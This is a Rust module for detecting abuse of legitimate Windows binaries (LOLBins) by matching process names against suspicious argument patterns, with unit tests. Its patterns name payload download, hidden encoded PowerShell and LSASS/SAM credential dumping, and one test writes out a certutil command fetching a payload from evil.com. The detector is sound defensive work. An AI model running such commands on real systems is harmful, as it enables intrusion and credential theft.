//! Living Off The Land Binaries (LOLBins) detection.
//!
//! LOLBins are legitimate Windows executables that can be abused by
//! attackers for download, execution, or lateral movement. Detecting
//! their usage (especially with suspicious arguments) is a key
//! indicator of post-exploitation activity.

/// Categories of LOLBin abuse.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum LolbinCategory {
    /// Can execute arbitrary code/scripts
    Execution,
    /// Can download files from the internet
    Download,
    /// Can be used for lateral movement
    LateralMovement,
    /// Can compile code on the target
    Compilation,
    /// Can bypass application whitelisting
    AppWhitelistBypass,
    /// Can be used for persistence
    Persistence,
    /// Can dump credentials or sensitive data
    CredentialAccess,
}

/// A LOLBin entry: process name + category + suspicious argument patterns.
pub struct LolbinEntry {
    pub name: &'static str,
    pub category: LolbinCategory,
    /// Argument patterns that indicate abuse (substring match).
    pub suspicious_args: &'static [&'static str],
    pub description: &'static str,
}

/// All known LOLBins.
pub static LOLBINS: &[LolbinEntry] = &[
    // Execution
    LolbinEntry {
        name: "mshta.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &["javascript:", "vbscript:", "http://", "https://"],
        description: "HTML Application host — can execute scripts from URLs",
    },
    LolbinEntry {
        name: "wscript.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[".js", ".vbs", ".wsf", "//e:", "//b"],
        description: "Windows Script Host — executes scripts",
    },
    LolbinEntry {
        name: "cscript.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[".js", ".vbs", ".wsf", "//e:", "//b"],
        description: "Console Script Host — executes scripts",
    },
    LolbinEntry {
        name: "rundll32.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[
            "javascript:",
            "shell32.dll",
            "url.dll",
            "\\\\",
            "http",
            "comsvcs.dll",
            "MiniDump",
        ],
        description: "DLL loader — can execute arbitrary DLL exports",
    },
    LolbinEntry {
        name: "regsvr32.exe",
        category: LolbinCategory::AppWhitelistBypass,
        suspicious_args: &["/s", "/i:", "scrobj.dll", "http://", "https://", "/u"],
        description: "COM registration — can bypass AppLocker via scrobj.dll",
    },
    LolbinEntry {
        name: "msiexec.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &["/q", "http://", "https://", "\\\\"],
        description: "Windows Installer — can install remote MSI payloads",
    },
    // Download
    LolbinEntry {
        name: "certutil.exe",
        category: LolbinCategory::Download,
        suspicious_args: &[
            "-urlcache",
            "-split",
            "-decode",
            "-encode",
            "-decodehex",
            "http://",
            "https://",
        ],
        description: "Certificate utility — commonly abused for file download/decode",
    },
    LolbinEntry {
        name: "bitsadmin.exe",
        category: LolbinCategory::Download,
        suspicious_args: &["/transfer", "/addfile", "http://", "https://"],
        description: "BITS admin — can download files in background",
    },
    // PowerShell
    LolbinEntry {
        name: "powershell.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[
            "-enc",
            "-encodedcommand",
            "-nop",
            "-noprofile",
            "-ep bypass",
            "-executionpolicy bypass",
            "iex",
            "invoke-expression",
            "downloadstring",
            "downloadfile",
            "net.webclient",
            "bitstransfer",
            "-w hidden",
            "-windowstyle hidden",
            "frombase64",
            "reflection.assembly",
        ],
        description: "PowerShell — most versatile LOLBin for post-exploitation",
    },
    LolbinEntry {
        name: "pwsh.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[
            "-enc",
            "-encodedcommand",
            "-nop",
            "iex",
            "downloadstring",
            "-w hidden",
        ],
        description: "PowerShell Core — same risks as powershell.exe",
    },
    LolbinEntry {
        name: "cmd.exe",
        category: LolbinCategory::Execution,
        suspicious_args: &[
            "/c powershell",
            "/c certutil",
            "/c bitsadmin",
            "\\\\",
            "| powershell",
        ],
        description: "Command prompt — often used as execution wrapper",
    },
    // Compilation
    LolbinEntry {
        name: "csc.exe",
        category: LolbinCategory::Compilation,
        suspicious_args: &["/out:", "Temp", "AppData"],
        description: "C# compiler — can compile malicious assemblies on target",
    },
    LolbinEntry {
        name: "msbuild.exe",
        category: LolbinCategory::AppWhitelistBypass,
        suspicious_args: &[".xml", ".csproj", "Temp", "AppData"],
        description: "Build engine — can execute inline tasks bypassing AppLocker",
    },
    // Lateral Movement
    LolbinEntry {
        name: "psexec.exe",
        category: LolbinCategory::LateralMovement,
        suspicious_args: &["\\\\", "-s", "-d", "-accepteula"],
        description: "Sysinternals PsExec — remote execution",
    },
    LolbinEntry {
        name: "wmic.exe",
        category: LolbinCategory::LateralMovement,
        suspicious_args: &[
            "/node:",
            "process call create",
            "os get",
            "/format:",
            "http",
        ],
        description: "WMI command-line — remote execution and reconnaissance",
    },
    // Credential Access
    LolbinEntry {
        name: "procdump.exe",
        category: LolbinCategory::CredentialAccess,
        suspicious_args: &["-ma", "lsass", "-accepteula"],
        description: "Process dumper — commonly used to dump LSASS for credentials",
    },
    LolbinEntry {
        name: "taskmgr.exe",
        category: LolbinCategory::CredentialAccess,
        suspicious_args: &[],
        description: "Task Manager — can create memory dumps of processes",
    },
    // Misc
    LolbinEntry {
        name: "schtasks.exe",
        category: LolbinCategory::Persistence,
        suspicious_args: &["/create", "/sc", "/tn", "/tr", "cmd", "powershell"],
        description: "Task scheduler — used for persistence",
    },
    LolbinEntry {
        name: "at.exe",
        category: LolbinCategory::Persistence,
        suspicious_args: &[],
        description: "Legacy task scheduler — used for persistence",
    },
    LolbinEntry {
        name: "reg.exe",
        category: LolbinCategory::Persistence,
        suspicious_args: &[
            "add",
            "Run",
            "RunOnce",
            "CurrentVersion\\Run",
            "HKLM",
            "export",
            "save",
            "sam",
            "security",
            "system",
        ],
        description: "Registry editor — used for persistence and credential access",
    },
];

/// Check if a process name is a known LOLBin.
pub fn find_lolbin(process_name: &str) -> Option<&'static LolbinEntry> {
    let lower = process_name.to_lowercase();
    LOLBINS.iter().find(|l| l.name.to_lowercase() == lower)
}

/// Check if command line arguments match suspicious patterns for a LOLBin.
pub fn check_suspicious_args(process_name: &str, cmdline: &str) -> Vec<&'static str> {
    let cmdline_lower = cmdline.to_lowercase();
    if let Some(entry) = find_lolbin(process_name) {
        entry
            .suspicious_args
            .iter()
            .filter(|&&pattern| cmdline_lower.contains(&pattern.to_lowercase()))
            .copied()
            .collect()
    } else {
        Vec::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_find_lolbin() {
        assert!(find_lolbin("powershell.exe").is_some());
        assert!(find_lolbin("POWERSHELL.EXE").is_some());
        assert!(find_lolbin("notepad.exe").is_none());
    }

    #[test]
    fn test_check_suspicious_args() {
        let matches = check_suspicious_args(
            "powershell.exe",
            "powershell.exe -nop -w hidden -enc SGVsbG8=",
        );
        assert!(matches.contains(&"-nop"));
        assert!(matches.contains(&"-w hidden"));
        assert!(matches.contains(&"-enc"));
    }

    #[test]
    fn test_check_suspicious_args_no_match() {
        let matches = check_suspicious_args("powershell.exe", "powershell.exe Get-Date");
        assert!(matches.is_empty());
    }

    #[test]
    fn test_check_suspicious_args_not_lolbin() {
        let matches = check_suspicious_args("notepad.exe", "notepad.exe file.txt");
        assert!(matches.is_empty());
    }

    #[test]
    fn test_certutil_download() {
        let matches = check_suspicious_args(
            "certutil.exe",
            "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\temp\\payload.exe",
        );
        assert!(matches.contains(&"-urlcache"));
        assert!(matches.contains(&"-split"));
        assert!(matches.contains(&"http://"));
    }

    #[test]
    fn test_lolbin_count() {
        assert!(LOLBINS.len() >= 18);
    }
}
